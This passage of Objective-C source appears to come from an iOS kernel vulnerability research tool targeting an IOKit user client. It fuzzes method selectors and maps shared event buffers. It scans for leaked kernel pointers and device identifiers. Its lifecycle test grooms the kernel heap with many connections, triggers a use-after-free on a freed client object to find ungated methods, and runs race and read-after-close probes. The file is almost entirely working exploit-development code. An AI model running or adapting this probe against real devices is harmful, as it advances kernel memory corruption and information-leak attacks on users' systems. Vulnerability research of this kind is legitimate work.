    [self appendLog:@"\n====== Phase 6: Extended Selector Probing ======"];

    if (connection == MACH_PORT_NULL || !sIOConnectCallMethod) {
        [self appendLog:@"SKIP: no active connection for selector probing."];
        [self appendLog:@"====== Phase 6 Complete ======"];
        return;
    }

    for (uint32_t sel = 3; sel <= 15; sel++) {
        kern_return_t krMinimal = sIOConnectCallMethod(connection, sel, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
        uint64_t scalarZero = 0;
        kern_return_t krScalar = sIOConnectCallMethod(connection, sel, &scalarZero, 1, NULL, 0, NULL, NULL, NULL, NULL);
        const char *xml = kOpenPropertiesXML;
        kern_return_t krStruct = sIOConnectCallMethod(connection, sel, NULL, 0, xml, strlen(xml) + 1, NULL, NULL, NULL, NULL);

        [self appendLog:[NSString stringWithFormat:
                         @"selector[%u] minimal=0x%x (%s) scalar0=0x%x (%s) structXML=0x%x (%s)",
                         sel,
                         krMinimal, mach_error_string(krMinimal),
                         krScalar, mach_error_string(krScalar),
                         krStruct, mach_error_string(krStruct)]];

        BOOL anySuccess = (krMinimal == KERN_SUCCESS || krScalar == KERN_SUCCESS || krStruct == KERN_SUCCESS);
        if (anySuccess && sIOConnectMapMemory64) {
            mach_vm_address_t mapAddr = 0;
            mach_vm_size_t mapSize = 0;
            kern_return_t mapKr = sIOConnectMapMemory64(connection, kMemoryTypeEventBuffer, mach_task_self(), &mapAddr, &mapSize, 1);
            [self appendLog:[NSString stringWithFormat:
                             @"  selector[%u] post-success map(type=0): 0x%x (%s) addr=0x%llx size=%llu",
                             sel, mapKr, mach_error_string(mapKr), mapAddr, mapSize]];
            if (mapKr == KERN_SUCCESS && mapAddr != 0 && mapSize > 0) {
                const uint8_t *buf = (const uint8_t *)(uintptr_t)mapAddr;
                size_t previewLen = MIN((size_t)32, (size_t)mapSize);
                [self appendLog:[NSString stringWithFormat:@"  selector[%u] map preview: %@",
                                 sel, [self hexPreview:buf length:previewLen]]];
                [self appendLog:[NSString stringWithFormat:@"  selector[%u] map header: %@",
                                 sel, [self eventHeaderSummary:buf length:(size_t)mapSize]]];

                BOOL unmapped = NO;
                if (sIOConnectUnmapMemory64) {
                    kern_return_t unmapKr = sIOConnectUnmapMemory64(connection, kMemoryTypeEventBuffer, mach_task_self(), mapAddr);
                    [self appendLog:[NSString stringWithFormat:@"  selector[%u] unmap(type=0): 0x%x (%s)",
                                     sel, unmapKr, mach_error_string(unmapKr)]];
                    unmapped = (unmapKr == KERN_SUCCESS);
                }
                if (!unmapped) {
                    kern_return_t deallocKr = vm_deallocate(mach_task_self(), (vm_address_t)mapAddr, (vm_size_t)mapSize);
                    [self appendLog:[NSString stringWithFormat:@"  selector[%u] fallback vm_deallocate: 0x%x (%s)",
                                     sel, deallocKr, mach_error_string(deallocKr)]];
                }
            }
        }
    }

    [self appendLog:@"====== Phase 6 Complete ======"];
}

#pragma mark - Phase 7: Registry Property Traversal

- (NSString *)cfTypeName:(CFTypeRef)value {
    if (!value) return @"<null>";
    CFTypeID tid = CFGetTypeID(value);
    if (tid == CFStringGetTypeID()) return @"CFString";
    if (tid == CFNumberGetTypeID()) return @"CFNumber";
    if (tid == CFBooleanGetTypeID()) return @"CFBoolean";
    if (tid == CFDataGetTypeID()) return @"CFData";
    if (tid == CFArrayGetTypeID()) return @"CFArray";
    if (tid == CFDictionaryGetTypeID()) return @"CFDictionary";
    if (tid == CFSetGetTypeID()) return @"CFSet";
    return [NSString stringWithFormat:@"CFTypeID(%lu)", (unsigned long)tid];
}

- (void)runPhase7RegistryPropertyTraversal:(io_connect_t)connection {
    [self appendLog:@"\n====== Phase 7: Registry Property Traversal ======"];

    if (connection == MACH_PORT_NULL || !sIOConnectGetService || !sIORegistryEntryCreateCFProperties || !sIOObjectRelease) {
        [self appendLog:@"SKIP: required symbols unavailable for registry traversal."];
        [self appendLog:@"====== Phase 7 Complete ======"];
        return;
    }

    io_service_t service = MACH_PORT_NULL;
    kern_return_t getSvcKr = sIOConnectGetService(connection, &service);
    if (getSvcKr != KERN_SUCCESS || service == MACH_PORT_NULL) {
        [self appendLog:[NSString stringWithFormat:@"SKIP: IOConnectGetService failed: 0x%x (%s)",
                         getSvcKr, mach_error_string(getSvcKr)]];
        [self appendLog:@"====== Phase 7 Complete ======"];
        return;
    }

    NSString *serviceClass = nil;
    NSString *serviceName = nil;
    uint64_t entryID = 0;
    NSString *label = [self labelForService:service outClass:&serviceClass outName:&serviceName outEntryID:&entryID];
    [self appendLog:[NSString stringWithFormat:@"target service: %@", label]];

    CFMutableDictionaryRef props = NULL;
    kern_return_t propsKr = sIORegistryEntryCreateCFProperties(service, &props, kCFAllocatorDefault, 0);
    if (propsKr != KERN_SUCCESS || !props) {
        [self appendLog:[NSString stringWithFormat:@"IORegistryEntryCreateCFProperties failed: 0x%x (%s)",
                         propsKr, mach_error_string(propsKr)]];
        sIOObjectRelease(service);
        [self appendLog:@"====== Phase 7 Complete ======"];
        return;
    }

    CFIndex count = CFDictionaryGetCount(props);
    [self appendLog:[NSString stringWithFormat:@"propertyCount=%ld", (long)count]];
    if (count > 0) {
        const void **keys = (const void **)malloc((size_t)count * sizeof(void *));
        const void **vals = (const void **)malloc((size_t)count * sizeof(void *));
        if (keys && vals) {
            CFDictionaryGetKeysAndValues(props, keys, vals);
            uint32_t flagged = 0;
            for (CFIndex i = 0; i < count; i++) {
                CFTypeRef keyRef = (CFTypeRef)keys[i];
                CFTypeRef valRef = (CFTypeRef)vals[i];

                NSString *key = nil;
                if (keyRef && CFGetTypeID(keyRef) == CFStringGetTypeID()) {
                    key = [(__bridge NSString *)keyRef copy];
                } else {
                    key = [self compactCFValue:keyRef];
                }
                NSString *type = [self cfTypeName:valRef];
                NSString *summary = [self compactCFValue:valRef];
                if (summary.length > 180) {
                    summary = [[summary substringToIndex:180] stringByAppendingString:@"..."];
                }
                [self appendLog:[NSString stringWithFormat:@"  key[%ld] %@ type=%@ value=%@",
                                 (long)i, key, type, summary]];

                NSString *lk = key.lowercaseString ?: @"";
                NSString *ls = summary.lowercaseString ?: @"";
                NSMutableArray<NSString *> *reasons = [NSMutableArray array];

                if ([ls containsString:@"/"] || [lk containsString:@"path"]) {
                    [reasons addObject:@"file-path-like"];
                }
                if ([ls containsString:@"com."] || [lk containsString:@"bundle"]) {
                    [reasons addObject:@"bundle-id-like"];
                }
                if ([ls containsString:@"entitlement"] || [lk containsString:@"entitlement"]) {
                    [reasons addObject:@"entitlement-like"];
                }
                if ([ls containsString:@"0xffff"] || [ls containsString:@"0xffffff"]) {
                    [reasons addObject:@"kernel-address-like"];
                }
                if ([lk containsString:@"uuid"] || [lk containsString:@"udid"] || [lk containsString:@"serial"]
                    || [lk containsString:@"ecid"] || [lk containsString:@"imei"] || [lk containsString:@"chipid"]
                    || [lk containsString:@"unique"]) {
                    [reasons addObject:@"device-identifier-like"];
                }
                if (valRef && CFGetTypeID(valRef) == CFNumberGetTypeID()) {
                    uint64_t num = 0;
                    if (CFNumberGetValue((CFNumberRef)valRef, kCFNumberSInt64Type, &num)) {
                        if (num >= 0xFFFF000000000000ULL) {
                            [reasons addObject:@"numeric-kernel-pointer-like"];
                        }
                    }
                }

                if (reasons.count > 0) {
                    flagged++;
                    [self appendLog:[NSString stringWithFormat:@"    FLAG: %@",
                                     [reasons componentsJoinedByString:@", "]]];
                }
            }
            [self appendLog:[NSString stringWithFormat:@"flaggedProperties=%u", flagged]];
        } else {
            [self appendLog:@"property dump skipped: allocation failure"];
        }
        free((void *)keys);
        free((void *)vals);
    }

    CFRelease(props);
    sIOObjectRelease(service);
    [self appendLog:@"====== Phase 7 Complete ======"];
}

#pragma mark - Phase 8: Connection Port Analysis

- (void)runPhase8ConnectionPortAnalysis:(io_connect_t)connection {
    [self appendLog:@"\n====== Phase 8: Connection Port Analysis ======"];

    if (connection == MACH_PORT_NULL) {
        [self appendLog:@"SKIP: no connection port available."];
        [self appendLog:@"====== Phase 8 Complete ======"];
        return;
    }

    mach_port_context_t ctx = 0;
    kern_return_t ctxKr = mach_port_get_context(mach_task_self(), connection, &ctx);
    [self appendLog:[NSString stringWithFormat:@"mach_port_get_context: 0x%x (%s) context=0x%llx",
                     ctxKr, mach_error_string(ctxKr), (unsigned long long)ctx]];

    ipc_info_object_type_t objectType = 0;
    mach_vm_address_t objectAddr = 0;
    kobject_description_t description = {0};
    kern_return_t descKr = mach_port_kobject_description(
        mach_task_self(),
        connection,
        &objectType,
        &objectAddr,
        description
    );
    if (descKr == KERN_SUCCESS) {
        [self appendLog:[NSString stringWithFormat:
                         @"mach_port_kobject_description: SUCCESS type=%u addr=0x%llx desc=\"%s\"",
                         objectType, objectAddr, description]];
    } else {
        [self appendLog:[NSString stringWithFormat:
                         @"mach_port_kobject_description: 0x%x (%s)",
                         descKr, mach_error_string(descKr)]];
    }

    if (!sIOConnectMapMemory64) {
        [self appendLog:@"map(type=1..3): SKIP (IOConnectMapMemory64 unavailable)"];
        [self appendLog:@"====== Phase 8 Complete ======"];
        return;
    }

    for (uint32_t memType = 1; memType <= 3; memType++) {
        mach_vm_address_t mapAddr = 0;
        mach_vm_size_t mapSize = 0;
        kern_return_t mapKr = sIOConnectMapMemory64(connection, memType, mach_task_self(), &mapAddr, &mapSize, 1);
        [self appendLog:[NSString stringWithFormat:
                         @"map(memoryType=%u): 0x%x (%s) addr=0x%llx size=%llu",
                         memType, mapKr, mach_error_string(mapKr), mapAddr, mapSize]];

        if (mapKr != KERN_SUCCESS || mapAddr == 0 || mapSize == 0) {
            continue;
        }

        const uint8_t *buf = (const uint8_t *)(uintptr_t)mapAddr;
        size_t previewLen = MIN((size_t)32, (size_t)mapSize);
        size_t scanLen = MIN((size_t)256, (size_t)mapSize);
        size_t nonZero = 0;
        for (size_t i = 0; i < scanLen; i++) {
            if (buf[i] != 0) nonZero++;
        }
        [self appendLog:[NSString stringWithFormat:@"  preview=%@", [self hexPreview:buf length:previewLen]]];
        [self appendLog:[NSString stringWithFormat:@"  first%zu nonZero=%zu", scanLen, nonZero]];

        BOOL unmapped = NO;
        if (sIOConnectUnmapMemory64) {
            kern_return_t unmapKr = sIOConnectUnmapMemory64(connection, memType, mach_task_self(), mapAddr);
            [self appendLog:[NSString stringWithFormat:@"  unmap(memoryType=%u): 0x%x (%s)",
                             memType, unmapKr, mach_error_string(unmapKr)]];
            unmapped = (unmapKr == KERN_SUCCESS);
        }
        if (!unmapped) {
            kern_return_t deallocKr = vm_deallocate(mach_task_self(), (vm_address_t)mapAddr, (vm_size_t)mapSize);
            [self appendLog:[NSString stringWithFormat:@"  fallback vm_deallocate(memoryType=%u): 0x%x (%s)",
                             memType, deallocKr, mach_error_string(deallocKr)]];
        }
    }

    [self appendLog:@"====== Phase 8 Complete ======"];
}

#pragma mark - Deep Probe Entry Point

- (void)deepProbeTapped {
    self.deepProbeButton.enabled = NO;

    [self appendLog:@"\n\n========== DEEP BOUNDARY PROBES =========="];

    if (![self loadIOKitSymbols]) {
        [self appendLog:@"FAIL: could not load IOKit symbols."];
        self.deepProbeButton.enabled = YES;
        return;
    }

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        // Acquire a gateable connection by iterating instances with selector 0.
        io_connect_t mainConn = MACH_PORT_NULL;
        kern_return_t gateKr = [self probeOpenVariantXML:kOpenPropertiesXML
                                                   label:@"Deep probe gate candidate"
                                          keepConnection:YES
                                     runPreOpenCopyProbe:NO
                                           outPreCopyKr:NULL
                                     outPreCopyNonZero:NULL
                                          outConnection:&mainConn];
        [self appendLog:[NSString stringWithFormat:@"Main connection gate: 0x%x (%s)",
                         gateKr, mach_error_string(gateKr)]];
        if (gateKr == (kern_return_t)0xE00002C5) {
            [self appendLog:@"NOTE: Gate blocked by exclusive-access precondition on available instances."];
        }
        if (gateKr != KERN_SUCCESS || mainConn == MACH_PORT_NULL) {
            if (mainConn != MACH_PORT_NULL) {
                sIOServiceClose(mainConn);
            }
            dispatch_async(dispatch_get_main_queue(), ^{ self.deepProbeButton.enabled = YES; });
            return;
        }

        // Map shared memory
        mach_vm_address_t mappedAddr = 0;
        mach_vm_size_t mappedSize = 0;
        kern_return_t mapKr = KERN_FAILURE;
        BOOL haveMapped = NO;
        if (gateKr == KERN_SUCCESS && sIOConnectMapMemory64) {
            mapKr = sIOConnectMapMemory64(mainConn, kMemoryTypeEventBuffer,
                                           mach_task_self(), &mappedAddr, &mappedSize, 1);
            haveMapped = (mapKr == KERN_SUCCESS && mappedAddr != 0 && mappedSize > 0);
            [self appendLog:[NSString stringWithFormat:@"MapMemory: 0x%x mapped=%@ addr=0x%llx size=%llu",
                             mapKr, haveMapped ? @"YES" : @"NO", mappedAddr, mappedSize]];
        }

        // ---- Phase 1: Binary format probe (reuses this gated connection) ----
        [self runBinaryFormatProbe:mainConn];

        // ---- Phase 2: Concurrency stress test (uses main connection) ----
        BOOL phase2Clean = YES;
        if (gateKr == KERN_SUCCESS) {
            phase2Clean = [self runConcurrencyStressTest:mainConn];

            // Re-open the gate after concurrency test may have closed it
            uint64_t scalarIn = 0;
            const char *xml = kOpenPropertiesXML;
            kern_return_t reopenKr = sIOConnectCallMethod(
                mainConn, kSelectorOpen,
                &scalarIn, 1,
                xml, strlen(xml) + 1,
                NULL, NULL, NULL, NULL
            );
            [self appendLog:[NSString stringWithFormat:@"Post-concurrency re-open: 0x%x (%s)",
                             reopenKr, mach_error_string(reopenKr)]];

            // Re-map if needed — unmap old mapping first to avoid leak.
            // If unmap symbol is missing, skip remap to avoid orphaning the old mapping.
            if (haveMapped && sIOConnectMapMemory64 && sIOConnectUnmapMemory64) {
                if (mappedAddr) {
                    sIOConnectUnmapMemory64(mainConn, kMemoryTypeEventBuffer, mach_task_self(), mappedAddr);
                }
                mach_vm_address_t newAddr = 0;
                mach_vm_size_t newSize = 0;
                kern_return_t remapKr = sIOConnectMapMemory64(mainConn, kMemoryTypeEventBuffer,
                                                               mach_task_self(), &newAddr, &newSize, 1);
                if (remapKr == KERN_SUCCESS && newAddr != 0 && newSize > 0) {
                    mappedAddr = newAddr;
                    mappedSize = newSize;
                } else {
                    // Old mapping was unmapped; mark as unavailable
                    mappedAddr = 0;
                    mappedSize = 0;
                    haveMapped = NO;
                }
            }
        } else {
            [self appendLog:@"\n====== Phase 2: SKIPPED (gate not open) ======"];
        }

        // ---- Phase 3: Event visibility probe (uses main connection + mapped buffer) ----
        if (gateKr == KERN_SUCCESS && phase2Clean) {
            [self runEventCapture:mainConn mappedAddr:mappedAddr mappedSize:mappedSize];
        } else if (!phase2Clean) {
            [self appendLog:@"\n====== Phase 3: SKIPPED (Phase 2 workers did not drain — connection state uncertain) ======"];
        } else {
            [self appendLog:@"\n====== Phase 3: SKIPPED (gate not open) ======"];
        }

        // ---- Phase 4: Broad IOKit service enumeration ----
        [self runPhase4BroadServiceEnumeration];

        // ---- Phase 5: Mapped memory bounds audit ----
        [self runPhase5MappedMemoryBoundsAudit:mainConn mappedAddr:mappedAddr mappedSize:mappedSize];

        // ---- Phase 6: Extended selector probing ----
        [self runPhase6ExtendedSelectorProbing:mainConn];

        // ---- Phase 7: Registry property traversal ----
        [self runPhase7RegistryPropertyTraversal:mainConn];

        // ---- Phase 8: Connection-port analysis ----
        [self runPhase8ConnectionPortAnalysis:mainConn];

        // ---- Cleanup ----
        [self appendLog:@"\n--- Deep Probe Cleanup ---"];
        if (haveMapped && mappedAddr) {
            kern_return_t cleanupUnmapKr = KERN_FAILURE;
            if (sIOConnectUnmapMemory64) {
                cleanupUnmapKr = sIOConnectUnmapMemory64(mainConn, kMemoryTypeEventBuffer, mach_task_self(), mappedAddr);
            }
            if (!sIOConnectUnmapMemory64 || cleanupUnmapKr != KERN_SUCCESS) {
                kern_return_t cleanupDeallocKr = vm_deallocate(mach_task_self(), (vm_address_t)mappedAddr, (vm_size_t)mappedSize);
                [self appendLog:[NSString stringWithFormat:@"Deep probe unmap/dealloc cleanup: unmap=0x%x dealloc=0x%x",
                                 cleanupUnmapKr, cleanupDeallocKr]];
            }
        }
        uint64_t closeScalar = 0;
        sIOConnectCallMethod(mainConn, kSelectorClose, &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
        sIOServiceClose(mainConn);

        [self appendLog:@"\n========== DEEP BOUNDARY PROBES COMPLETE =========="];

        dispatch_async(dispatch_get_main_queue(), ^{
            self.deepProbeButton.enabled = YES;
        });
    });
}

#pragma mark - Lifecycle Boundary Test

- (void)lifecycleBoundaryTapped {
    self.lifecycleButton.enabled = NO;
    self.triggerButton.enabled = NO;
    self.deepProbeButton.enabled = NO;

    [self appendLog:@"\n\n========== OBJECT LIFECYCLE BOUNDARY TEST =========="];

    if (![self loadIOKitSymbols]) {
        [self appendLog:@"FAIL: could not load IOKit symbols."];
        self.lifecycleButton.enabled = YES;
        self.triggerButton.enabled = YES;
        self.deepProbeButton.enabled = YES;
        return;
    }

    [self clearLifecyclePocState];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        // Open multiple connections to the SAME provider.
        // Each connection has its own per-userclient IOCommandGate, so close
        // on conn[0] and open on conn[1..N] enter the provider concurrently
        // unless the provider serializes internally (workloop, provider gate, etc.).
        // Target many connections for maximum ClientObject churn in the type-isolated zone.
        // Each gated connection creates a ClientObject (0x48 bytes) in the same zone.
        // Accept whatever the provider allows — even 4 is useful.
        //
        // Leave at least one spare slot for the termination-race thread, which needs
        // to open/close fresh userclients repeatedly. Some providers cap the number
        // of simultaneous userclients; if we consume the full cap here, IOServiceOpen
        // in the race thread may fail with kIOReturnUnsupported.
        enum { kDesiredConnections = 15 };
        io_connect_t conns[kDesiredConnections];
        io_service_t providerService = MACH_PORT_NULL;
        int connCount = [self openMultipleGatedConnections:conns
                                                  maxCount:kDesiredConnections
                                                outService:&providerService];

        if (connCount < 2) {
            [self appendLog:[NSString stringWithFormat:
                @"Need at least 2 connections for multi-gate lifecycle test, got %d. Falling back to single-connection mode.", connCount]];
            // Fall back: if we got 1, use it; if 0, bail
            if (connCount == 0) {
                [self appendLog:@"Cannot proceed — no connections established."];
                if (providerService != MACH_PORT_NULL) {
                    sIOObjectRelease(providerService);
                }
                dispatch_async(dispatch_get_main_queue(), ^{
                    self.lifecycleButton.enabled = YES;
                    self.triggerButton.enabled = YES;
                    self.deepProbeButton.enabled = YES;
                });
                return;
            }
        }

        [self appendLog:[NSString stringWithFormat:@"Established %d connections to same provider (separate per-userclient gates)", connCount]];

        // ---- Method Table Probe: find un-gated selectors via UAF ----
        // Provider only allows exclusive access — can't open a new probe conn.
        // Instead, sacrifice the LAST connection: close it → dangling ref,
        // sweep selectors 2-30 on the dead ClientObject, then exclude it.
        // Gated methods → kIOReturnNotPermitted (0xe00002c5) = gate caught dead client.
        // Un-gated methods → anything else = bypassed gate, ran with freed ClientObject.
        if (connCount >= 3) {
            [self appendLog:@"\n====== Method Table Probe (UAF gate bypass sweep) ======"];
            io_connect_t probeConn = conns[connCount - 1];
            conns[connCount - 1] = MACH_PORT_NULL;
            connCount--;  // exclude from lifecycle pool

            // Close → frees ClientObject, probeConn is now dangling
            {
                uint64_t closeScalar = 0;
                sIOConnectCallMethod(probeConn, kSelectorClose, &closeScalar, 1,
                    NULL, 0, NULL, NULL, NULL, NULL);
            }

            // Probe selectors 2-30 on the dangling connection
            NSMutableString *unGated = [NSMutableString string];
            int unGatedCnt = 0;
            for (uint32_t sel = 2; sel <= 30; sel++) {
                uint64_t out[4] = {0};
                uint32_t outCnt = 4;
                kern_return_t kr = sIOConnectCallMethod(probeConn, sel,
                    NULL, 0, NULL, 0,
                    out, &outCnt,
                    NULL, NULL);
                if (kr != (kern_return_t)0xE00002C5) {
                    [unGated appendFormat:@"\n    sel=%u kr=0x%x out=[0x%llx,0x%llx,0x%llx,0x%llx]",
                        sel, kr, out[0], out[1], out[2], out[3]];
                    unGatedCnt++;
                }
            }

            sIOServiceClose(probeConn);

            if (unGatedCnt > 0) {
                [self appendLog:[NSString stringWithFormat:@"  UN-GATED (%d/29 bypass gate):%@",
                    unGatedCnt, unGated]];
            } else {
                [self appendLog:@"  All selectors 2-30 GATED — only copyEvent(sel=2) bypasses gate"];
            }
            [self appendLog:[NSString stringWithFormat:@"  Remaining pool: %d connections", connCount]];
            [self appendLog:@"====== Method Table Probe Complete ======\n"];
        } else {
            [self appendLog:[NSString stringWithFormat:@"  Method probe skipped — need >=3 conns (have %d)", connCount]];
        }

        // Map shared memory on the primary connection
        io_connect_t primaryConn = conns[0];
        mach_vm_address_t mappedAddr = 0;
        mach_vm_size_t mappedSize = 0;
        BOOL haveMapped = NO;
        if (sIOConnectMapMemory64) {
            kern_return_t mapKr = sIOConnectMapMemory64(primaryConn, kMemoryTypeEventBuffer,
                                                         mach_task_self(), &mappedAddr, &mappedSize, 1);
            haveMapped = (mapKr == KERN_SUCCESS && mappedAddr != 0 && mappedSize > 0);
            [self appendLog:[NSString stringWithFormat:@"MapMemory: 0x%x mapped=%@ addr=0x%llx size=%llu",
                             mapKr, haveMapped ? @"YES" : @"NO", mappedAddr, mappedSize]];
        }

        if (!haveMapped) {
                [self appendLog:@"Cannot proceed — shared buffer not mapped."];
            for (int i = 0; i < connCount; i++) {
                uint64_t closeScalar = 0;
                sIOConnectCallMethod(conns[i], kSelectorClose, &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
                sIOServiceClose(conns[i]);
            }
            if (providerService != MACH_PORT_NULL) {
                sIOObjectRelease(providerService);
            }
            dispatch_async(dispatch_get_main_queue(), ^{
                self.lifecycleButton.enabled = YES;
                self.triggerButton.enabled = YES;
                self.deepProbeButton.enabled = YES;
            });
            return;
        }

        // ---- Sub-phase A: Mapped Buffer Baseline Scan ----
        [self runBaselineScan:primaryConn mappedAddr:mappedAddr mappedSize:mappedSize];

        // Capture pre-stress snapshot and entropy for sub-phases C and D
        size_t snapLen = MIN((size_t)mappedSize, (size_t)kMappedProbeMaxBytes);
        NSData *preSnapshot = [NSData dataWithBytes:(const void *)(uintptr_t)mappedAddr length:snapLen];
        double preEntropy = [self shannonEntropyForBytes:(const uint8_t *)(uintptr_t)mappedAddr length:snapLen];
        uint64_t preHash = 0;
        {
            const uint8_t *p = (const uint8_t *)(uintptr_t)mappedAddr;
            size_t hashLen = MIN((size_t)64, snapLen);
            for (size_t i = 0; i < hashLen; i++) {
                preHash ^= ((uint64_t)p[i]) << ((i % 8) * 8);
            }
        }
        [self appendLog:[NSString stringWithFormat:@"Pre-stress baseline: entropy=%.4f hash=0x%016llx", preEntropy, preHash]];

        // Map memory on auxiliary connections for cross-client observation.
        // If the ClientObject reference at conn[0] becomes invalidated during
        // copyEvent, the provider may write event data to a different client's buffer.
        // Monitoring these buffers for unexpected updates is a cross-client boundary signal.
        mach_vm_address_t auxMappedAddrs[kDesiredConnections];
        mach_vm_size_t auxMappedSizes[kDesiredConnections];
        memset(auxMappedAddrs, 0, sizeof(auxMappedAddrs));
        memset(auxMappedSizes, 0, sizeof(auxMappedSizes));
        for (int i = 1; i < connCount; i++) {
            mach_vm_address_t addr = 0;
            mach_vm_size_t sz = 0;
            kern_return_t mkr = sIOConnectMapMemory64(conns[i], kMemoryTypeEventBuffer,
                                                       mach_task_self(), &addr, &sz, 1);
            if (mkr == KERN_SUCCESS && addr != 0 && sz > 0) {
                auxMappedAddrs[i] = addr;
                auxMappedSizes[i] = sz;
            }
        }
        int auxMappedCount = 0;
        for (int i = 1; i < connCount; i++) {
            if (auxMappedAddrs[i] != 0) auxMappedCount++;
        }
        [self appendLog:[NSString stringWithFormat:@"Cross-client observation: mapped %d auxiliary connection buffers", auxMappedCount]];

        // ---- Sub-phase B: Lifecycle Desynchronization Stress ----
        BOOL canRunLifecycleStress = (connCount >= 2);
        if (canRunLifecycleStress) {
            [self runLifecycleDesyncStress:conns count:connCount mappedAddr:mappedAddr mappedSize:mappedSize
                             auxMappings:auxMappedAddrs auxMappedSizes:auxMappedSizes
                              raceService:providerService];

            // Post-stress: bring conn[0] to a known state for sub-phases C/D.
            //
            // Note: The stress workers already perform open/close cycles, so calling "open" again here
            // can legitimately return "already open"/exclusive access style errors. To avoid treating
            // a valid steady-state as an anomaly, do an explicit close->open transition.
            for (int i = 0; i < connCount; i++) {
                if (i == 0) {
                    uint64_t closeScalar = 0;
                    kern_return_t ckr = sIOConnectCallMethod(
                        conns[i], kSelectorClose,
                        &closeScalar, 1, NULL, 0,
                        NULL, NULL, NULL, NULL
                    );

                    uint64_t openScalar = 0;
                    const char *xml = kOpenPropertiesXML;
                    kern_return_t okr = sIOConnectCallMethod(
                        conns[i], kSelectorOpen,
                        &openScalar, 1,
                        xml, strlen(xml) + 1,
                        NULL, NULL, NULL, NULL
                    );

                    [self appendLog:[NSString stringWithFormat:
                        @"Post-stress sync conn[0]: close=0x%x (%s) open=0x%x (%s)",
                        ckr, mach_error_string(ckr), okr, mach_error_string(okr)]];
                }
            }

            // ---- Sub-phase C: Post-Stress Structural Analysis ----
            [self runPostStressStructuralAnalysis:primaryConn mappedAddr:mappedAddr mappedSize:mappedSize preSnapshot:preSnapshot];

            // ---- Sub-phase D: Post-Lifecycle Buffer Fingerprint ----
            [self runPostLifecycleFingerprint:primaryConn
                                   mappedAddr:mappedAddr
                                   mappedSize:mappedSize
                                   preEntropy:preEntropy
                                      preHash:preHash
                             primaryScanCount:self.proofPrimaryScanCount
                             primaryLeakCount:self.proofPrimaryLeakCount];

            // ---- Sub-phase E1: Read-After-Close Memory Boundary Probe ----
            [self runReadAfterCloseProbe:conns count:connCount
                              mappedAddr:mappedAddr mappedSize:mappedSize
                             raceService:providerService];

            // ---- Sub-phase E2: Uninitialized Buffer Probe ----
            [self runUninitBufferProbe:providerService];

            // ---- Sub-phase E3: Post-Close Remap Boundary Probe ----
            [self runRemapAfterFreeProbe:providerService];

        } else {
            [self appendLog:@"Skipping lifecycle desynchronization stress and post-stress sub-phases (single-connection mode)."];
        }

        // ---- Cleanup ----
        [self appendLog:@"\n--- Lifecycle Test Cleanup ---"];
        if (mappedAddr) {
            kern_return_t cleanupUnmapKr = KERN_FAILURE;
            if (sIOConnectUnmapMemory64) {
                cleanupUnmapKr = sIOConnectUnmapMemory64(primaryConn, kMemoryTypeEventBuffer, mach_task_self(), mappedAddr);
            }
            if (!sIOConnectUnmapMemory64 || cleanupUnmapKr != KERN_SUCCESS) {
                kern_return_t cleanupDeallocKr = vm_deallocate(mach_task_self(), (vm_address_t)mappedAddr, (vm_size_t)mappedSize);
                [self appendLog:[NSString stringWithFormat:@"Lifecycle cleanup primary unmap/dealloc: unmap=0x%x dealloc=0x%x",
                                 cleanupUnmapKr, cleanupDeallocKr]];
            }
        }
        for (int i = 1; i < connCount; i++) {
            if (auxMappedAddrs[i] != 0) {
                kern_return_t auxUnmapKr = KERN_FAILURE;
                if (sIOConnectUnmapMemory64) {
                    auxUnmapKr = sIOConnectUnmapMemory64(conns[i], kMemoryTypeEventBuffer, mach_task_self(), auxMappedAddrs[i]);
                }
                if (!sIOConnectUnmapMemory64 || auxUnmapKr != KERN_SUCCESS) {
                    kern_return_t auxDeallocKr = vm_deallocate(mach_task_self(), (vm_address_t)auxMappedAddrs[i], (vm_size_t)auxMappedSizes[i]);
                    [self appendLog:[NSString stringWithFormat:@"Lifecycle aux cleanup[%d]: unmap=0x%x dealloc=0x%x",
                                     i, auxUnmapKr, auxDeallocKr]];
                }
            }
        }
        for (int i = 0; i < connCount; i++) {
            uint64_t closeScalar = 0;
            sIOConnectCallMethod(conns[i], kSelectorClose, &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
            sIOServiceClose(conns[i]);
        }
        if (providerService != MACH_PORT_NULL) {
            sIOObjectRelease(providerService);
        }

        [self appendLog:@"\n========== LIFECYCLE BOUNDARY TEST COMPLETE =========="];

        dispatch_async(dispatch_get_main_queue(), ^{
            self.lifecycleButton.enabled = YES;
            self.triggerButton.enabled = YES;
            self.deepProbeButton.enabled = YES;
        });
    });
}

#pragma mark - Sub-phase A: Mapped Buffer Baseline Scan

- (void)runBaselineScan:(io_connect_t)connection
                mappedAddr:(mach_vm_address_t)mappedAddr
                mappedSize:(mach_vm_size_t)mappedSize {
    [self appendLog:@"\n====== Sub-phase A: Mapped Buffer Baseline Scan ======"];

    // Populate the buffer with a copyEvent call
    uint64_t scalarsIn[2] = { 0, 1 };
    uint8_t structOut[64];
    size_t structOutSize = sizeof(structOut);
    kern_return_t copyKr = sIOConnectCallMethod(
        connection, kSelectorCopyEvent,
        scalarsIn, 2, NULL, 0,
        NULL, NULL, structOut, &structOutSize
    );
    [self appendLog:[NSString stringWithFormat:@"Baseline copyEvent: 0x%x (%s)", copyKr, mach_error_string(copyKr)]];

    const uint8_t *base = (const uint8_t *)(uintptr_t)mappedAddr;
    size_t totalSize = MIN((size_t)mappedSize, (size_t)kMappedProbeMaxBytes);

    // Buffer format (confirmed via IDA):
    //   [0..3]   uint32_t payloadLen
    //   [4..]    payloadLen bytes of event payload
    uint32_t eventSize = 0;
    if (totalSize >= 4) {
        memcpy(&eventSize, base, sizeof(eventSize));
    }
    size_t eventRegionBytes = totalSize;
    if (totalSize >= 4) {
        uint64_t needed = 4ull + (uint64_t)eventSize;
        eventRegionBytes = (needed <= totalSize) ? (size_t)needed : totalSize;
    }

    [self appendLog:[NSString stringWithFormat:@"Mapped region: %zu bytes, eventSize=%u (0x%x)",
                     totalSize, eventSize, eventSize]];

    // Scan the full mapped region in 8-byte aligned steps for kernel address patterns
    uint32_t kernPtrCount = 0;
    uint32_t kernPtrInEvent = 0;
    uint32_t kernPtrOutside = 0;

    for (size_t off = 0; off + 8 <= totalSize; off += 8) {
        uint64_t val = 0;
